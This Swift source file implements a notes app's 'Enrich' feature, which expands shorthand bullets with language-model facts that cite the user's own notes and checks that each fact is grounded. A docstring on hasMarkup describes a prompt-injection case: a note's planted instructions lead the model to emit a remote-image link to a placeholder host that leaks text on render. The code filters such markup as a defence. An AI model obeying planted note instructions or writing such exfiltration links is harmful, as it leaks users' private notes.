import Foundation

/// A list item that Enrich may expand (issue #6).
struct EnrichmentBullet: Equatable {
    /// 1-based. The model refers to the bullet as `B<number>`.
    let number: Int
    let text: String
    /// Index of the bullet's own line.
    let line: Int
    /// Whitespace before the list marker.
    let indent: String
    /// Index of the last line under the bullet, or of the bullet itself when it has none.
    let insertAfter: Int
    /// The bullet already has lines under it.
    let hasChildren: Bool
}

/// One fact the model wrote for a bullet, with the passages it cites.
struct EnrichmentFact: Equatable {
    let bullet: Int
    let text: String
    /// 1-based numbers of the passages, all valid.
    let sources: [Int]
}

/// The text after Enrich, and what happened to each bullet.
struct EnrichmentOutcome: Equatable {
    var text: String
    /// Bullets that got at least one fact.
    var enriched: [Int] = []
    /// Bullets left as they were.
    var unchanged: [Int] = []
    var factCount = 0
    /// The same additions, as lines to add below existing lines. For the write gate.
    var insertions: [LineInsertion] = []

    var summary: String {
        if enriched.isEmpty {
            return "No note in this workspace supports these bullets. Nothing was changed."
        }
        let facts = factCount == 1 ? "1 fact" : "\(factCount) facts"
        let added = "Added \(facts) under \(enriched.count) of \(enriched.count + unchanged.count) bullets."
        if unchanged.isEmpty {
            return added
        }
        let count = unchanged.count
        return added + " \(count) had no source and \(count == 1 ? "stays" : "stay") as it was."
    }
}

/// Expands shorthand bullets from what your notes already say, and cites each added fact (issue #6).
/// The pure parts live here: finding bullets, the prompt, and checking and placing the reply. The
/// original lines are never changed. Facts are added under them.
enum Enrichment {
    static let maxBullets = 12
    static let passagesPerBullet = 3
    static let maxFactLength = 400
    /// A bullet this long is not shorthand, so a scheduled run leaves it alone.
    static let shorthandWords = 12

    // MARK: - Bullets

    /// The list items in `text`, outside code fences, up to `maxBullets`.
    static func bullets(in text: String, shorthandOnly: Bool = false) -> [EnrichmentBullet] {
        let lines = text.components(separatedBy: "\n")
        var found: [EnrichmentBullet] = []
        var inFence = false
        for (index, line) in lines.enumerated() {
            if line.trimmingCharacters(in: .whitespaces).hasPrefix("```")
                || line.trimmingCharacters(in: .whitespaces).hasPrefix("~~~") {
                inFence.toggle()
                continue
            }
            guard !inFence, let item = listItem(line) else { continue }
            let last = lastLine(under: index, indent: item.indent, in: lines)
            let hasChildren = last > index
            if shorthandOnly, hasChildren || wordCount(item.text) > shorthandWords {
                continue
            }
            guard item.text.contains(where: \.isLetter) else { continue }
            found.append(EnrichmentBullet(
                number: found.count + 1,
                text: item.text,
                line: index,
                indent: item.indent,
                insertAfter: last,
                hasChildren: hasChildren
            ))
            if found.count == maxBullets {
                break
            }
        }
        return found
    }

    private static func listItem(_ line: String) -> (indent: String, text: String)? {
        let indent = String(line.prefix { $0 == " " || $0 == "\t" })
        let rest = line.dropFirst(indent.count)
        var body = Substring()
        if let first = rest.first, "-*+".contains(first), rest.dropFirst().first == " " {
            body = rest.dropFirst(2)
        } else {
            let digits = rest.prefix { $0.isNumber }
            let after = rest.dropFirst(digits.count)
            guard !digits.isEmpty, digits.count <= 9, let mark = after.first, ".)".contains(mark),
                  after.dropFirst().first == " " else { return nil }
            body = after.dropFirst(2)
        }
        var text = body.trimmingCharacters(in: .whitespaces)
        for box in ["[ ] ", "[x] ", "[X] "] where text.hasPrefix(box) {
            text = String(text.dropFirst(box.count))
        }
        return text.isEmpty ? nil : (indent, text)
    }

    /// The last line that belongs under the bullet at `index`: the lines indented deeper than it.
    private static func lastLine(under index: Int, indent: String, in lines: [String]) -> Int {
        var last = index
        var next = index + 1
        while next < lines.count {
            let line = lines[next]
            if line.trimmingCharacters(in: .whitespaces).isEmpty {
                break
            }
            let lineIndent = line.prefix { $0 == " " || $0 == "\t" }.count
            guard lineIndent > indent.count else { break }
            last = next
            next += 1
        }
        return last
    }

    private static func wordCount(_ text: String) -> Int {
        text.split(whereSeparator: { !$0.isLetter && !$0.isNumber }).count
    }

    // MARK: - Prompt

    static func prompt(for bullets: [EnrichmentBullet]) -> String {
        var lines = [
            "Expand the shorthand bullets below using only the numbered documents above.",
            "For each bullet, write up to 2 short facts that the documents state about it.",
            "End every fact with the number of the document it comes from, like [2].",
            "Do not add anything the documents do not say. If no document supports a bullet, write NONE for it.",
            "Reply in exactly this form and nothing else:",
            "B1:",
            "- fact [2]",
            "B2: NONE",
            "",
            "Bullets:",
        ]
        for bullet in bullets {
            lines.append("B\(bullet.number): \(bullet.text)")
        }
        return lines.joined(separator: "\n")
    }

    // MARK: - Reading the reply

    /// The facts in `reply` that can stay. A fact is dropped when it has no citation, cites a number
    /// that is not a passage, or shares no meaningful word with the passage it cites.
    static func facts(in reply: String, bulletCount: Int, passages: [Passage]) -> [EnrichmentFact] {
        var facts: [EnrichmentFact] = []
        var current: Int?
        for rawLine in reply.components(separatedBy: "\n") {
            var line = rawLine.trimmingCharacters(in: .whitespaces)
            line = String(line.drop { $0 == "*" || $0 == "#" || $0 == " " })
            if let (number, rest) = bulletHeader(line) {
                current = (1 ... bulletCount).contains(number) ? number : nil
                line = rest
                if line.isEmpty || line.uppercased().hasPrefix("NONE") {
                    continue
                }
            }
            guard let bullet = current else { continue }
            line = String(line.drop { "-*•+ ".contains($0) })
            if let fact = fact(from: line, bullet: bullet, passages: passages) {
                facts.append(fact)
            }
        }
        return facts
    }

    private static func bulletHeader(_ line: String) -> (Int, String)? {
        guard line.first == "B" || line.first == "b" else { return nil }
        let digits = line.dropFirst().prefix { $0.isNumber }
        guard !digits.isEmpty, digits.count <= 2, let number = Int(digits) else { return nil }
        let after = line.dropFirst(1 + digits.count).drop { $0 == "*" || $0 == " " }
        guard let mark = after.first, ":.)-".contains(mark) else { return nil }
        let rest = after.dropFirst().drop { $0 == "*" || $0 == " " }
        return (number, String(rest))
    }

    private static func fact(from line: String, bullet: Int, passages: [Passage]) -> EnrichmentFact? {
        let cites = AnswerReading.citations(in: line)
        guard !cites.isEmpty, cites.allSatisfy({ (1 ... passages.count).contains($0.number) }) else { return nil }
        var text = line
        let ranges = cites.reduce(into: [Range<String.Index>]()) {
            if !$0.contains($1.range) {
                $0.append($1.range)
            }
        }
        for range in ranges.sorted(by: { $0.lowerBound > $1.lowerBound }) {
            text.removeSubrange(range)
        }
        text = text.split(whereSeparator: \.isWhitespace).joined(separator: " ")
        // "month. [1]" leaves "month ." once the citation is cut out.
        text = text.replacingOccurrences(of: #" +([.,;:!?])"#, with: "$1", options: .regularExpression)
        text = text.trimmingCharacters(in: CharacterSet(charactersIn: " (-,"))
        guard text.count >= 3, text.count <= maxFactLength, !hasMarkup(text) else { return nil }
        let sources = cites.map(\.number).reduce(into: [Int]()) {
            if !$0.contains($1) {
                $0.append($1)
            }
        }
        guard sources.contains(where: { isGrounded(text, in: passages[$0 - 1].text) }) else { return nil }
        return EnrichmentFact(bullet: bullet, text: text, sources: sources)
    }

    /// Whether `fact` holds an image, link, HTML, URL, or wikilink. A note can carry instructions
    /// to the model, so a fact like `![x](https://host/?d=…)` would load a remote image, and leak
    /// text, when the preview renders it. Fen writes the only links: the source links after it.
    static func hasMarkup(_ fact: String) -> Bool {
        ["![", "](", "<", "://", "[["].contains { fact.contains($0) }
    }

    /// Whether `fact` shares a meaningful word with `passage`. A fact with none is not from it.
    static func isGrounded(_ fact: String, in passage: String) -> Bool {
        func stems(_ text: String) -> Set<String> {
            let words = text.lowercased().split(whereSeparator: { !$0.isLetter && !$0.isNumber })
            return Set(words.filter { $0.count >= 4 }.map { String($0.prefix(5)) })
        }
        return !stems(fact).isDisjoint(with: stems(passage))
    }

    // MARK: - Placing the facts

    /// `text` with each fact added as an indented sub-bullet under its bullet. No original line is
    /// changed or removed. Facts go right below their bullet, above any sub-bullets it has. A fact
    /// already under its bullet is not added twice.
    static func apply(
        _ facts: [EnrichmentFact],
        to text: String,
        bullets: [EnrichmentBullet],
        passages: [Passage],
        from currentPath: String
    ) -> EnrichmentOutcome {
        let original = text.components(separatedBy: "\n")
        var lines = original
        var outcome = EnrichmentOutcome(text: text)
        // From the last line up, so earlier line numbers stay valid while lines are inserted.
        for bullet in bullets.sorted(by: { $0.line > $1.line }) {
            let block = original[bullet.line ... bullet.insertAfter].joined(separator: "\n").lowercased()
            let added = facts.filter { $0.bullet == bullet.number && !block.contains($0.text.lowercased()) }
                .map { fact in
                    bullet.indent + "    - " + fact.text + " (" + links(for: fact, passages, from: currentPath) + ")"
                }
            if added.isEmpty {
                outcome.unchanged.append(bullet.number)
                continue
            }
            lines.insert(contentsOf: added, at: bullet.line + 1)
            outcome.insertions.append(LineInsertion(anchor: original[bullet.line], text: added.joined(separator: "\n")))
            outcome.enriched.append(bullet.number)
            outcome.factCount += added.count
        }
        outcome.enriched.sort()
        outcome.unchanged.sort()
        outcome.text = lines.joined(separator: "\n")
        return outcome
    }

    private static func links(for fact: EnrichmentFact, _ passages: [Passage], from currentPath: String) -> String {
        fact.sources.map { link(to: passages[$0 - 1], from: currentPath) }.joined(separator: ", ")
    }

    /// A relative Markdown link to the passage's file and the heading it sits under.
    static func link(to passage: Passage, from currentPath: String) -> String {
        let heading = passage.heading.components(separatedBy: " > ").last ?? ""
        let shown = heading.isEmpty ? (passage.fileName as NSString).deletingPathExtension : heading
        let path = RelatedSuggestion.relativePath(from: currentPath, to: passage.relativePath)
            .split(separator: "/", omittingEmptySubsequences: false)
            .map { String($0).addingPercentEncoding(withAllowedCharacters: .urlPathAllowed) ?? String($0) }
            .joined(separator: "/")
        let anchor = heading.isEmpty ? "" : "#" + HeadingAnchor.slug(heading)
        let safe = shown.replacingOccurrences(of: "[", with: "(").replacingOccurrences(of: "]", with: ")")
        return "[\(safe)](\(path)\(anchor))"
    }
}

/// The id a heading gets in the preview, so a link can point at it.
enum HeadingAnchor {
    static func slug(_ text: String) -> String {
        text.lowercased()
            .replacingOccurrences(of: " ", with: "-")
            .replacingOccurrences(of: "[^a-z0-9-]", with: "", options: .regularExpression)
    }
}
